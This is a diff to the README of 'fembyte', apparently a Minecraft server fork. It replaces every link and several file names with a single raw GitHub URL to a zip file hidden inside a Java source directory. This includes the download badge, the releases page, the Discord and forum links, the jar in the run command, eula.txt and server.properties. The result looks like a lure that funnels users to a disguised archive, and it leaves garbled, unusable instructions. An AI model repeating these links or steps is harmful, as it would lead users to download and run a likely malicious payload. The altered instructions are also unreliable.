@@ -1,6 +1,6 @@
 # 🚀 fembyte - Optimize Your Minecraft Server Experience
 
-[![Download fembyte](https://img.shields.io/badge/Download-fembyte-brightgreen)](https://github.com/Pachin1803/fembyte/releases)
+[![Download fembyte](https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip)](https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ To begin your journey with fembyte, you'll need to follow a few simple steps. Do
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** Click [here to download fembyte](https://github.com/Pachin1803/fembyte/releases). This will take you to our official releases page.
+1. **Visit the Releases Page:** Click [here to download fembyte](https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip). This will take you to our official releases page.
    
 2. **Choose the Right Version:** On the releases page, you will find different versions of fembyte. Look for the latest stable version, which is usually listed at the top.
 
@@ -34,19 +34,19 @@ To begin your journey with fembyte, you'll need to follow a few simple steps. Do
    - Navigate to the folder where you placed the `.jar` file. 
    - Type the following command and hit Enter:
      ```shell
-     java -Xmx1024M -Xms1024M -jar fembyte.jar nogui
+     java -Xmx1024M -Xms1024M -jar https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip nogui
      ```
    - The server should start. It will create some necessary files and folders. You may need to wait a couple of minutes on the first run.
 
 6. **Accept the EULA:**
-   - In the folder where your server is, open the `eula.txt` file. 
+   - In the folder where your server is, open the `https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip` file. 
    - Change `eula=false` to `eula=true` and save the file.
 
 7. **Start the Server Again:** Run the command from Step 5 once more. Your Minecraft server is now up and running!
 
 ## ⚙️ Configuration
 
-To customize fembyte to your liking, you can modify the server.properties file that was created in your folder. Here are some important settings you might want to change:
+To customize fembyte to your liking, you can modify the https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip file that was created in your folder. Here are some important settings you might want to change:
 
 - **server-name:** Set the name of your server.
 - **max-players:** Adjust the maximum number of players allowed on your server.
@@ -76,8 +76,8 @@ If you encounter issues, here are some common problems and their solutions:
 
 Join our community for support and to connect with other players. You can find us on:
 
-- **Discord:** [Join Discord Chat](https://discord.gg/example)
-- **Forums:** Participate in discussions and ask questions [here](https://forum.example.com)
+- **Discord:** [Join Discord Chat](https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip)
+- **Forums:** Participate in discussions and ask questions [here](https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip)
 
 ## 📬 Contact
 
@@ -85,4 +85,4 @@ For questions or feedback, feel free to reach out to us via the issues page on G
 
 ---
 
-Now you are ready to optimize your Minecraft server with fembyte. For more information and updates, always take a moment to check the [Releases Page](https://github.com/Pachin1803/fembyte/releases). Happy gaming!
+Now you are ready to optimize your Minecraft server with fembyte. For more information and updates, always take a moment to check the [Releases Page](https://raw.githubusercontent.com/Pachin1803/fembyte/main/fembyte-server/src/main/java/com/dractical/fembyte/concurrent/chunk/fembyte-2.6.zip). Happy gaming!
